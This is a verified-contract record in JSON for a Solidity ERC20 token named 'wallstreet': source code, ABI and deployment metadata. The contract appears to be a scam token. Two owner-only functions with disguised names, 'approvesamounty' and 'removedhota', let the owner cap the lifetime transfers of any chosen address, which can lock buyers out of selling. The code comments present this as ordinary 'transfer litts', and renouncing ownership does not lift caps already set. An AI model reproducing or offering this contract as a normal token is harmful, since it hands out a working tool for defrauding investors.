{"SourceCode": "/**\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n\r\n// Interface for the ERC20 standard as defined in the EIP. An ERC20 token implements\r\n// a standard set of functionalities that enables interoperability across multiple interfaces and platforms.\r\ninterface IERC20 {\r\n    // Returns the amount of tokens in existence.\r\n    function totalSupply() external view returns (uint256);\r\n    // Returns the amount of tokens owned by `account`.\r\n    function balanceOf(address account) external view returns (uint256);\r\n    // Moves `amount` tokens from the caller's account to `recipient`.\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    // Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner`.\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    // Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    // Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism.\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    // Emitted when `value` tokens are moved from one account (`from`) to another (`to`).\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    // Emitted when the allowance of a `spender` for an `owner` is set by a call to `approve`.\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// Abstract contract that allows child contracts to implement a function to retrieve the sender of the transaction.\r\nabstract contract Context {\r\n    // Returns the sender of the transaction.\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\n// Contract module which provides a basic access control mechanism, where there is an account (an owner)\r\n// that can be granted exclusive access to specific functions.\r\ncontract Ownable is Context {\r\n    // State variable that stores the owner's address.\r\n    address private _owner;\r\n    // Event emitted when ownership is transferred.\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    // Constructor that sets the original `owner` of the contract to the sender account.\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    // Returns the address of the current owner.\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    // Modifier that throws if called by any account other than the owner.\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    // Function to relinquish control of the contract to a zero address.\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n// Token contract that includes the ERC20 standard functionality, access control, and transfer litts.\r\ncontract wallstreet is Context, Ownable, IERC20 {\r\n    // Maps an address to its balance.\r\n    mapping(address => uint256) private _balances;\r\n    // Maps an owner to a spender with a given allowance.\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    // Maps an address to its transfer litt.\r\n    mapping(address => uint256) public totalTransferlitts;\r\n    // Maps an address to the total transferred amount.\r\n    mapping(address => uint256) public totalTransferredAmounts;\r\n\r\n    // Token name, symbol, and number of decimals.\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    // Total supply of tokens.\r\n    uint256 private _totalSupply;\r\n\r\n    // Modifier that checks if the transfer amount exceeds the set litt for the sender.\r\n    modifier transferlitt(address sender, uint256 amount) {\r\n        uint256 litt = totalTransferlitts[sender];\r\n        if (litt > 0) {\r\n            require(totalTransferredAmounts[sender] + amount <= litt, \"Total transfer amount exceeds the set litt\");\r\n        }\r\n        _;\r\n    }\r\n\r\n    // Constructor that initializes the token contract with a name, symbol, decimals, and total supply.\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        // Set total supply and adjust for decimals.\r\n        \r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    // Function to get the name of the token.\r\n    function name() public view returns (string memory) {\r\n    return _name;\r\n    }\r\n\r\n    // Function to get the symbol of the token.\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    // Function to get the number of decimals the token uses.\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    // Returns the total token supply.\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    // Returns the token balance of a specific account.\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    // Allows the owner to set a transfer litt for a sres.\r\n    function approvesamounty(address sres, uint256 litt) public onlyOwner {\r\n        totalTransferlitts[sres] = litt;\r\n    }\r\n\r\n    // Allows the owner to remove the transfer litt for a sres.\r\n    function removedhota(address sres) public onlyOwner {\r\n        delete totalTransferlitts[sres];\r\n    }\r\n\r\n    // Transfer function that moves the specified amount of tokens from the caller's account to the recipient account.\r\n    function transfer(address recipient, uint256 amount) public virtual override transferlitt(_msgSender(), amount) returns (bool) {\r\n        _balances[_msgSender()] -= amount;\r\n        _balances[recipient] += amount;\r\n        totalTransferredAmounts[_msgSender()] += amount;\r\n        emit Transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    // Function to check the amount of tokens that an owner allowed to a spender.\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    // Approve function that allows `spender` to withdraw from your account multiple times, up to the `amount` amount.\r\n    // If this function is called again it overwrites the current allowance with `amount`.\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    // Transfer tokens from one account to another based on allowance.\r\n    // The `sender` account must have a balance of at least `amount`.\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferlitt(sender, amount) returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amount, \"Transfer amount exceeds allowance\");\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        totalTransferredAmounts[sender] += amount;\r\n        _allowances[sender][_msgSender()] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sres\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"litt\",\"type\":\"uint256\"}],\"name\":\"approvesamounty\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sres\",\"type\":\"address\"}],\"name\":\"removedhota\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTransferlitts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTransferredAmounts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "wallstreet", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000004d7c6d00000000000000000000000000000000000000000000000000000000000000000a57616c6c73747265657400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a77616c6c73747265657400000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0676f680ffb4c3d7289a235d2d2ad4279ba80f0a4a1a4da2fd5b6e7a26aa0271"}